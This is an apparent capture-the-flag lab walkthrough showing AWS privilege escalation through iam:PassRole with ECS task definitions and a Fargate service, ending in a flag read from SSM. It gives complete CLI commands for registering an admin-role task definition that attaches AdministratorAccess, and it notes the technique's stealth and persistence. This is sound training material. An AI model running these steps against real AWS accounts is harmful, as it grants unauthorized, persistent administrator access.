# Guided Walkthrough: Privilege Escalation via iam:PassRole + ecs:RegisterTaskDefinition + ecs:CreateService

This scenario demonstrates a privilege escalation vulnerability where a user has permissions to pass IAM roles to ECS tasks (`iam:PassRole`), register ECS task definitions (`ecs:RegisterTaskDefinition`), and create ECS services (`ecs:CreateService`). The attacker can create a malicious ECS task definition that uses an administrative execution role, then deploy it as a long-running service on AWS Fargate to modify IAM permissions and grant themselves administrator access.

ECS services provide persistent, continuously running container workloads where tasks receive temporary credentials based on their task execution role. Unlike one-time task execution with `ecs:RunTask`, services are designed for long-running operations and automatically restart tasks if they fail. By combining `iam:PassRole` with ECS service creation permissions, an attacker can establish persistent privileged access that appears legitimate in production environments where ECS services are expected to run continuously.

The attack works by registering a task definition that specifies an admin role and contains a containerized AWS CLI command to attach the AdministratorAccess policy to the starting user. When deployed as an ECS service on Fargate, the task executes with the admin role's credentials and persistently elevates the attacker's privileges. This technique provides both privilege escalation and persistence, making it particularly dangerous as the service will continue running until explicitly stopped, and can even recover from failures automatically.

## The Challenge

You start as `pl-prod-ecs-003-to-admin-starting-user`, an IAM user with credentials provided by Terraform outputs. Your permissions include `iam:PassRole` on the admin target role, `ecs:RegisterTaskDefinition`, and `ecs:CreateService` — but nothing that gives you direct IAM write access to your own account.

Your goal is to reach full administrator access. The `pl-prod-ecs-003-to-admin-target-role` IAM role has `AdministratorAccess` and trusts `ecs-tasks.amazonaws.com`. The ECS cluster `pl-prod-ecs-003-cluster` already exists and is ready to accept services.

## Reconnaissance

First, let's confirm who we are and what we cannot do yet:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::<account_id>:user/pl-prod-ecs-003-to-admin-starting-user

aws iam list-users --max-items 1
# AccessDenied -- we don't have admin permissions yet
```

Fetch your account ID, which you'll need when constructing IAM role ARNs:

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
```

Check the current policies attached to your user (none expected at the start):

```bash
aws iam list-attached-user-policies --user-name pl-prod-ecs-003-to-admin-starting-user
```

## Exploitation

### Step 1: Register a Malicious ECS Task Definition

Using `iam:PassRole`, you can specify the admin role as the task role and execution role in a new task definition. The container command will call `iam attach-user-policy` to attach `AdministratorAccess` to your starting user. Because the ECS task runs as the admin role, it has the IAM permissions to do this.

```bash
ADMIN_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-ecs-003-to-admin-target-role"

aws ecs register-task-definition --region $AWS_REGION --cli-input-json "{
  \"family\": \"pl-ecs-003-admin-escalation\",
  \"networkMode\": \"awsvpc\",
  \"requiresCompatibilities\": [\"FARGATE\"],
  \"cpu\": \"256\",
  \"memory\": \"512\",
  \"taskRoleArn\": \"${ADMIN_ROLE_ARN}\",
  \"executionRoleArn\": \"${ADMIN_ROLE_ARN}\",
  \"containerDefinitions\": [{
    \"name\": \"escalation-container\",
    \"image\": \"amazon/aws-cli:latest\",
    \"essential\": true,
    \"command\": [
      \"iam\", \"attach-user-policy\",
      \"--user-name\", \"pl-prod-ecs-003-to-admin-starting-user\",
      \"--policy-arn\", \"arn:aws:iam::aws:policy/AdministratorAccess\"
    ]
  }]
}"
```

### Step 2: Find a Subnet for the Fargate Service

Fargate services require a VPC subnet. Locate one from the default VPC:

```bash
DEFAULT_VPC=$(aws ec2 describe-vpcs \
  --filters "Name=is-default,Values=true" \
  --query 'Vpcs[0].VpcId' --output text)

DEFAULT_SUBNET=$(aws ec2 describe-subnets \
  --filters "Name=vpc-id,Values=${DEFAULT_VPC}" \
  --query 'Subnets[0].SubnetId' --output text)
```

### Step 3: Create an ECS Service to Execute the Task

Deploy the task definition as a Fargate service. AWS will launch a task that runs with the admin role's credentials and executes the container command, which attaches `AdministratorAccess` to your user:

```bash
aws ecs create-service \
  --region $AWS_REGION \
  --cluster pl-prod-ecs-003-cluster \
  --service-name pl-prod-ecs-003-attack-service \
  --task-definition pl-ecs-003-admin-escalation:1 \
  --desired-count 1 \
  --launch-type FARGATE \
  --network-configuration "awsvpcConfiguration={subnets=[${DEFAULT_SUBNET}],assignPublicIp=ENABLED}"
```

### Step 4: Wait for the Task to Complete

Monitor the service until a task is running, then wait for it to reach `STOPPED` status (meaning the container command finished):

```bash
aws ecs describe-services \
  --region $AWS_REGION \
  --cluster pl-prod-ecs-003-cluster \
  --services pl-prod-ecs-003-attack-service \
  --query 'services[0].{status:status,running:runningCount,desired:desiredCount}'
```

Once a task ARN appears, poll until it stops:

```bash
TASK_ARN=$(aws ecs list-tasks \
  --region $AWS_REGION \
  --cluster pl-prod-ecs-003-cluster \
  --service-name pl-prod-ecs-003-attack-service \
  --query 'taskArns[0]' --output text)

aws ecs describe-tasks \
  --region $AWS_REGION \
  --cluster pl-prod-ecs-003-cluster \
  --tasks $TASK_ARN \
  --query 'tasks[0].{status:lastStatus,exitCode:containers[0].exitCode}'
```

After the task stops, wait about 15 seconds for IAM changes to propagate:

```bash
sleep 15
```

## Verification

Confirm that `AdministratorAccess` is now attached to your user:

```bash
aws iam list-attached-user-policies \
  --user-name pl-prod-ecs-003-to-admin-starting-user \
  --query 'AttachedPolicies[*].PolicyName'
# ["AdministratorAccess"]
```

Now try listing IAM users — an action that was blocked before:

```bash
aws iam list-users --max-items 3
# Returns a list of users -- you have admin access
```

## Capture the Flag

Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` managed policy now granted to your starting user provides implicitly.

Using your starting user credentials (which, thanks to the previous step, now hold `AdministratorAccess`), read the flag:

```bash
aws ssm get-parameter \
    --name /pathfinding-labs/flags/ecs-003-to-admin \
    --query 'Parameter.Value' \
    --output text
# flag{...}  — your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them — only the scenario ID in the path changes.

## What Happened

You exploited the combination of `iam:PassRole` + `ecs:RegisterTaskDefinition` + `ecs:CreateService` to run arbitrary code as an admin IAM role without ever directly assuming that role. By registering a task definition with the admin role and deploying it as a service, you caused AWS's own ECS infrastructure to execute your IAM privilege escalation command on your behalf.

In real environments, this pattern is dangerous because ECS services are normal, expected workloads. A malicious service blends in with legitimate production services, the IAM change is attributed to the ECS task role rather than the original user, and the service persists indefinitely — automatically restarting failed tasks — providing durable elevated access.
